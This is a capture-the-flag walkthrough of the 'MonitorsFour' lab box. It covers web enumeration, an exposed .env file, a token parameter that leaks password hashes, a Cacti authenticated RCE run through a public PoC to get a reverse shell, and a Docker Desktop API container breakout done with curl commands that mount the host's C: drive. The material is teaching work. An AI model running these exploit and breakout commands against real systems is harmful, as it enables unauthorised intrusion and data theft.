+++
date = '2026-08-23T19:22:24+02:00'
draft = false
title = 'MonitorsFour Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`12/12/2025`**

![pwn.png](/images/imgs_monitors4/pwn.png)

---
# Introduction

**_MonitorsFour_** is an **Easy-level Windows** box that features an interesting mix of web enumeration and container breakout techniques. Interestingly, although it is classified as a **Windows** machine, the entire exploitation path is performed from within a **Linux** environment, without ever obtaining a native **Windows** shell.

The initial foothold involves discovering an exposed **`.env`** file and fuzzing an API endpoint to leak a JSON object containing hashed passwords. After cracking the hashes, we gain access to a **Cacti** instance and exploit a recent **Authenticated RCE** to obtain a shell inside a **Linux** container running on the **Windows** host.

For Privilege Escalation, we discover the host is running a vulnerable version of **Docker Desktop**. By interacting with the internally exposed **Docker API**, we can spin up a new container, mount the host's **`C:\`** drive, and read the **root flag** directly from the **Windows** filesystem.

---
# Techniques Used

- **Information Disclosure (.env file)**

- **API Fuzzing & Data Leakage**

- **Hash Cracking**

- **Cacti Authenticated RCE (CVE-2025-24367)**

- **Docker Desktop API Abuse (CVE-2025-9074)**

- **Container Breakout via Host Volume Mounting**

---
# Enumeration

## nmap

Initial scan on all ports:

```bash
nmap -p- monitors4 -Pn
```

```text
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
```

Targeted scan with scripts and version detection:

```bash
nmap -sC -sV monitors4 -Pn
```

```text
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Open ports**:

- **80**/tcp - HTTP

- **5985**/tcp - WinRM (wsman)

## Web Enumeration

I added **`monitorsfour.htb`** to my **`/etc/hosts`** file.
The web app looked identical to the one on **_MonitorsThree_**, so I immediately tested the login form for the same **SQL injection**, but with no results.

![web1.png](/images/imgs_monitors4/web1.png)

I ran a **gobuster** scan against directories:

```bash
gobuster dir -u http://monitorsfour.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

![gob1.png](/images/imgs_monitors4/gob1.png)

I noticed an exposed **`.env`** file, which I promptly downloaded. It leaked database credentials:

![env.png](/images/imgs_monitors4/env.png)

I tried to reuse the password **`f37p2j8f4t0r`** on the login form, but it didn't work.
So, I moved on to fuzzing for virtual hosts using **ffuf**:

```bash
ffuf -u http://monitorsfour.htb -H 'HOST: FUZZ.monitorsfour.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 138
```

![fuff.png](/images/imgs_monitors4/fuff.png)

I got a hit with the subdomain **cacti**, which I added to my **`/etc/hosts`** file.
Visiting the instance, it exposed the **`Cacti version: 1.2.28`**. 

![cacti.png](/images/imgs_monitors4/cacti.png)

I tried to log in using the retrieved credentials, but again, unsuccessfully.

I searched for vulnerabilities affecting this version and found **CVE-2025-24367** (**Authenticated RCE**). However, since I had no access to the platform yet, it was not exploitable.

I went back to my **gobuster** results and browsed to a **`/users`** endpoint I had retrieved earlier.
It returned a **JSON** error: **`{"error":"Missing token parameter"}`**.

![user.png](/images/imgs_monitors4/user.png)

I manually tested this parameter in the **URL**:
```text
http://monitorsfour.htb/users?token=0
```

![token.png](/images/imgs_monitors4/token.png)

It returned a large **JSON** object containing sensitive information. For a cleaner view, I pasted the output into a file and piped it to **jq**:

```bash
cat token | jq .
```

It contained hashed passwords for various users. I used [CrackStation](https://crackstation.net/) to test them and successfully cracked the **admin**'s hash to **`wonderful1`**.

![cracked.png](/images/imgs_monitors4/cracked.png)

---
# Initial Access | Cacti RCE

I used the cracked password to log into the main platform as the user **admin**.

![logged.png](/images/imgs_monitors4/logged.png)

I didn't notice anything immediately useful inside, except for the **Docker** version exposed in the changelog section: **`Docker Desktop 4.44.2`**.

![docker.png](/images/imgs_monitors4/docker.png)

I then tried using **`admin:wonderful1`** in **Cacti**'s login, but it failed.
Then I remembered that in the first boxes of the **_Monitors_** saga, the main user was called **`marcus`**. I tried **`marcus:wonderful1`** and successfully logged in.

![cacti_logged.png](/images/imgs_monitors4/cacti_logged.png)

**Note**: _**Admin**'s name was also exposed in the **JSON** object earlier: **`"name": "Marcus Higgins"`**. This confirmed the connection to the user **marcus** from the previous boxes._

Now that I was authenticated, I could test the **CVE** I found before.

**Note**: _**CVE-2025-24367** is an **Authenticated Remote Code Execution** vulnerability affecting **`Cacti 1.2.28`**. It typically involves improper sanitization in a vulnerable authenticated endpoint, allowing users with basic access to **execute arbitrary commands** on the underlying system._

I initially wanted to exploit it manually, but while searching for the **CVE**, I found a **PoC** written by **TheCyberGeek**, the creator of this box. Since the author wrote it, I knew it was probably going to work smoothly.

I downloaded it from: **https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC**

I set up a listener:

```bash
nc -lvnp 22667
```

And fired the exploit:

```bash
python3 exploit.py -u marcus -p wonderful1 -i 10.10.15.152 -l 22667 -url http://cacti.monitorsfour.htb
```

![init1.png](/images/imgs_monitors4/init1.png)

![init_access.png](/images/imgs_monitors4/init_access.png)

I obtained a reverse shell as **`www-data`** and was able to directly retrieve the **user flag** from **`marcus`**'s home directory without any further lateral movement.

![userf.png](/images/imgs_monitors4/userf.png)

---
# Privilege Escalation | Docker Desktop Breakout

From my shell, I tried connecting to the database using the **`.env`** leaked credentials, but unsuccessfully.

![db_fail.png](/images/imgs_monitors4/db_fail.png)

I read the **Cacti** config file to confirm those were the right credentials:

```bash
cat /var/www/html/cacti/include/config.php
```

They were correct.
Initially, I was stuck and had no idea what to do next. Then I remembered the **Docker** version I found earlier in the changelog section: **`Docker Desktop 4.44.2`**.

Searching online for privilege escalation vectors related to this version, I found **CVE-2025-9074**:

- **https://blog.qwertysecurity.com/Articles/blog3**

**Note**: _**CVE-2025-9074** refers to a vulnerability in **Docker Desktop** where the **Docker API** daemon might be exposed on the internal virtual network interface (in this case, **`192.168.65.7:2375`**). An attacker inside a container can communicate with this **API** without authentication to spin up new privileged containers or mount the host's filesystem, effectively breaking out of the container._

I readapted the **PoC** from the article at the end to match my scenario, using **curl** since **wget** was not present on this container.

I sent a **POST** request to create a new container:

```bash
curl -s -X POST http://192.168.65.7:2375/containers/create -H "Content-Type: application/json" -d '{"Image":"alpine", "Tty": true, "Cmd":["sh", "-c", "cat /mnt/users/administrator/desktop/root.txt"], "HostConfig":{"Binds":["/run/desktop/mnt/host/c/:/mnt"]}}'
```

**Note**: _This specific **curl** command interacts with the internal **Docker API** to create a new container using the lightweight **alpine** image. Crucially, the **`Binds`** array inside **`HostConfig`** maps the **Windows** host's **`C:\`** drive to **`/mnt`** inside the container. The **`Cmd`** is then set to simply **cat** the **`root.txt`** file from the mounted host filesystem._

The API returned the ID of the newly created container.

![created.png](/images/imgs_monitors4/created.png)

I started it using that ID:

```bash
curl -s -X POST http://192.168.65.7:2375/containers/32004fac0f80b0cdf02c00aeba82f5f839edaf06915d40fd9b4f4e7bf5f3c3b8/start
```

Finally, I retrieved the **root flag** directly from the logs of the container:

```bash
curl -s "http://192.168.65.7:2375/containers/32004fac0f80b0cdf02c00aeba82f5f839edaf06915d40fd9b4f4e7bf5f3c3b8/logs?stdout=1&stderr=1"
```

![rootf.png](/images/imgs_monitors4/rootf.png)

---
# Final Thoughts

This was a really fun and straightforward **Easy** box. Reusing the layout of **_MonitorsThree_** to create a false sense of familiarity was a nice touch. The initial foothold rewards good basic enumeration and thinking outside the box with **API parameter fuzzing**. The privilege escalation phase is a brilliant showcase of how dangerous an internally exposed **Docker API** can be on a **Windows** host, allowing for a clean container breakout.

**Sources**:

- **CVE-2025-24367 Cacti PoC | https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC**

- **Docker Desktop API Breakout (CVE-2025-9074) | https://blog.qwertysecurity.com/Articles/blog3**